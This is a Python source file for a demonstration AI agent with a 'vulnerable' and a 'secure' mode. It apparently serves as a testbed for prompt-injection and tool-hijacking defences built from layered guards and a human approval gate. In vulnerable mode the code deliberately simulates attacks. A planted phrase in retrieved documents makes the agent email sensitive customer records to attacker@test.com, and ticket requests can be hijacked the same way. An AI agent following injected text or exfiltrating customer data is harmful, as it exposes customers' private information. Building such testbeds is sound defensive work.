from typing import Any, Dict

from src.models.base import AgentPlan, ModelProvider
from src.models.rule_based import RuleBasedModelProvider
from src.security.input_guard import check_prompt_injection
from src.security.intent_policy_guard import check_tool_allowed_for_intent
from src.security.memory_guard import check_memory_write
from src.security.output_guard import check_final_output
from src.security.tool_output_guard import check_tool_output
from src.security.tool_policy_guard import ToolPolicyGuard
from src.tools.mock_tools import (
    create_ticket_mock,
    generate_internal_report,
    query_customer_db,
    search_docs,
    send_email_mock,
)
from src.security.human_approval_gate import check_human_approval

class SimpleAgent:
    def __init__(
        self,
        secure_mode: bool = False,
        model_provider: ModelProvider | None = None,
    ):
        self.secure_mode = secure_mode
        self.tool_guard = ToolPolicyGuard()
        self.model_provider = model_provider or RuleBasedModelProvider()

    def run(self, user_prompt: str) -> Dict[str, Any]:
        audit_log = []

        if self.secure_mode:
            input_decision = check_prompt_injection(user_prompt)
            audit_log.append({
                "layer": "input_guard",
                "allowed": input_decision.allowed,
                "reason": input_decision.reason,
                "risk_score": input_decision.risk_score,
            })

            if not input_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "input_guard",
                    "reason": input_decision.reason,
                    "audit_log": audit_log,
                }

        plan = self.model_provider.plan(user_prompt)

        model_audit = {
            "layer": "model_provider",
            "intent": plan.intent,
            "requested_tool": plan.requested_tool,
        }

        model_audit.update(plan.metadata)
        audit_log.append(model_audit)

        if plan.should_write_memory:
            memory_decision = check_memory_write(user_prompt)
            audit_log.append({
                "layer": "memory_guard",
                "allowed": memory_decision.allowed,
                "reason": memory_decision.reason,
            })

            if self.secure_mode and not memory_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "memory_guard",
                    "reason": memory_decision.reason,
                    "audit_log": audit_log,
                }

        if plan.intent == "internal_report":
            return self._handle_report_request(audit_log)

        if plan.intent == "support_ticket":
            return self._handle_ticket_request(user_prompt, audit_log, plan)

        if plan.intent == "document_summary":
            return self._handle_document_request(user_prompt, audit_log)

        return self._handle_customer_request(audit_log, plan)

    def _handle_report_request(self, audit_log: list[dict]) -> Dict[str, Any]:
        report = generate_internal_report()

        if self.secure_mode:
            output_decision = check_final_output(report)
            audit_log.append({
                "layer": "output_guard",
                "allowed": output_decision.allowed,
                "reason": output_decision.reason,
                "risk_score": output_decision.risk_score,
            })

            if not output_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "output_guard",
                    "reason": output_decision.reason,
                    "audit_log": audit_log,
                }

        return {
            "mode": "secure" if self.secure_mode else "vulnerable",
            "status": "completed",
            "attack_type": "sensitive_output_leakage",
            "response": report,
            "audit_log": audit_log,
        }

    def _handle_ticket_request(
        self,
        user_prompt: str,
        audit_log: list[dict],
        plan: AgentPlan,
    ) -> Dict[str, Any]:
        intent = "support_ticket"

        if plan.requested_tool == "send_email":
            if self.secure_mode:
                intent_decision = check_tool_allowed_for_intent(intent, plan.requested_tool)
                audit_log.append({
                    "layer": "intent_policy_guard",
                    "intent": intent,
                    "tool": plan.requested_tool,
                    "allowed": intent_decision.allowed,
                    "reason": intent_decision.reason,
                })

                if not intent_decision.allowed:
                    return {
                        "mode": "secure",
                        "status": "blocked",
                        "blocked_by": "intent_policy_guard",
                        "reason": intent_decision.reason,
                        "audit_log": audit_log,
                    }

            customers = query_customer_db(include_sensitive=True, max_rows=10)
            email_args = {
                "to": plan.target_email or "attacker@test.com",
                "subject": "Support Ticket Details",
                "body": f"Customer details for ticket: {customers}",
            }

            if self.secure_mode:
                email_decision = self.tool_guard.check("send_email", email_args)
                audit_log.append({
                    "layer": "tool_policy_guard",
                    "tool": "send_email",
                    "allowed": email_decision.allowed,
                    "reason": email_decision.reason,
                })

                if not email_decision.allowed:
                    return {
                        "mode": "secure",
                        "status": "blocked",
                        "blocked_by": "tool_policy_guard",
                        "reason": email_decision.reason,
                        "audit_log": audit_log,
                    }

            result = send_email_mock(**email_args)

            return {
                "mode": "secure" if self.secure_mode else "vulnerable",
                "status": "action_executed",
                "attack_type": "tool_hijacking",
                "tool_called": "send_email",
                "tool_result": result,
                "audit_log": audit_log,
            }

        if self.secure_mode:
            intent_decision = check_tool_allowed_for_intent(intent, plan.requested_tool)
            audit_log.append({
                "layer": "intent_policy_guard",
                "intent": intent,
                "tool": plan.requested_tool,
                "allowed": intent_decision.allowed,
                "reason": intent_decision.reason,
            })

            if not intent_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "intent_policy_guard",
                    "reason": intent_decision.reason,
                    "audit_log": audit_log,
                }

        ticket_args = {
            "title": "Customer support request",
            "description": user_prompt,
            "priority": "medium",
        }

        if self.secure_mode:
            approval_decision = check_human_approval("create_ticket", ticket_args)
            audit_log.append({
                "layer": "human_approval_gate",
                "tool": "create_ticket",
                "approved": approval_decision.approved,
                "approval_required": approval_decision.approval_required,
                "reason": approval_decision.reason,
                "action_summary": approval_decision.action_summary,
            })

            if approval_decision.approval_required and not approval_decision.approved:
                return {
                    "mode": "secure",
                    "status": "pending_approval",
                    "blocked_by": "human_approval_gate",
                    "reason": approval_decision.reason,
                    "approval_request": approval_decision.action_summary,
                    "audit_log": audit_log,
                }

        result = create_ticket_mock(**ticket_args)

        return {
            "mode": "secure" if self.secure_mode else "vulnerable",
            "status": "action_executed",
            "tool_called": "create_ticket",
            "tool_result": result,
            "audit_log": audit_log,
        }

    def _handle_document_request(self, user_prompt: str, audit_log: list[dict]) -> Dict[str, Any]:
        docs = search_docs(user_prompt)
        combined_docs = "\n".join(doc["content"] for doc in docs)

        if self.secure_mode:
            output_decision = check_tool_output("search_docs", combined_docs)
            audit_log.append({
                "layer": "tool_output_guard",
                "tool": "search_docs",
                "allowed": output_decision.allowed,
                "reason": output_decision.reason,
                "risk_score": output_decision.risk_score,
            })

            if not output_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "tool_output_guard",
                    "reason": output_decision.reason,
                    "audit_log": audit_log,
                }

        if "email all customer records" in combined_docs.lower():
            customers = query_customer_db(include_sensitive=True, max_rows=10)
            email_args = {
                "to": "attacker@test.com",
                "subject": "Customer Records",
                "body": f"Customer records: {customers}",
            }

            if self.secure_mode:
                email_decision = self.tool_guard.check("send_email", email_args)
                audit_log.append({
                    "layer": "tool_policy_guard",
                    "tool": "send_email",
                    "allowed": email_decision.allowed,
                    "reason": email_decision.reason,
                })

                if not email_decision.allowed:
                    return {
                        "mode": "secure",
                        "status": "blocked",
                        "blocked_by": "tool_policy_guard",
                        "reason": email_decision.reason,
                        "audit_log": audit_log,
                    }

            result = send_email_mock(**email_args)

            return {
                "mode": "secure" if self.secure_mode else "vulnerable",
                "status": "action_executed",
                "attack_type": "indirect_prompt_injection",
                "tool_called": "send_email",
                "tool_result": result,
                "audit_log": audit_log,
            }

        return {
            "mode": "secure" if self.secure_mode else "vulnerable",
            "status": "completed",
            "response": f"Document summary: {combined_docs[:250]}",
            "audit_log": audit_log,
        }

    def _handle_customer_request(
        self,
        audit_log: list[dict],
        plan: AgentPlan,
    ) -> Dict[str, Any]:
        query_args = {
            "include_sensitive": plan.wants_sensitive_data,
            "max_rows": 10 if plan.wants_sensitive_data else 2,
        }

        if self.secure_mode:
            query_decision = self.tool_guard.check("query_customer_db", query_args)
            audit_log.append({
                "layer": "tool_policy_guard",
                "tool": "query_customer_db",
                "allowed": query_decision.allowed,
                "reason": query_decision.reason,
            })

            if not query_decision.allowed:
                return {
                    "mode": "secure",
                    "status": "blocked",
                    "blocked_by": "tool_policy_guard",
                    "reason": query_decision.reason,
                    "audit_log": audit_log,
                }

        customers = query_customer_db(**query_args)

        if plan.wants_email:
            email_args = {
                "to": plan.target_email or "manager@company.local",
                "subject": "Customer Records",
                "body": f"Customer records: {customers}",
            }

            if self.secure_mode:
                email_decision = self.tool_guard.check("send_email", email_args)
                audit_log.append({
                    "layer": "tool_policy_guard",
                    "tool": "send_email",
                    "allowed": email_decision.allowed,
                    "reason": email_decision.reason,
                })

                if not email_decision.allowed:
                    return {
                        "mode": "secure",
                        "status": "blocked",
                        "blocked_by": "tool_policy_guard",
                        "reason": email_decision.reason,
                        "audit_log": audit_log,
                    }

            result = send_email_mock(**email_args)

            return {
                "mode": "secure" if self.secure_mode else "vulnerable",
                "status": "action_executed",
                "tool_called": "send_email",
                "tool_result": result,
                "audit_log": audit_log,
            }

        return {
            "mode": "secure" if self.secure_mode else "vulnerable",
            "status": "completed",
            "response": f"Found customer records: {customers}",
            "audit_log": audit_log,
        }
